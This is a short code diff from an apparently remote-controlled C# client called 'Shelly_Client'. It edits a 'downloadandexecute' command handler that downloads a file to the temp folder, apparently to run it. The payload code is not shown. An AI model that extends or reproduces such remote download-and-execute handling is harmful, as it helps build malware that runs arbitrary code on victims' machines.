@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Threading;
 
 namespace Shelly_Client
 {
@@ -49,7 +48,7 @@ namespace Shelly_Client
                 case "downloadandexecute":
 
                     // Download file and drop to temp
-                    Functions.General.DAE(Command[1]);
+                    Functions.General.DAE(Command[1], Command[2]);
                     
                     break;
 
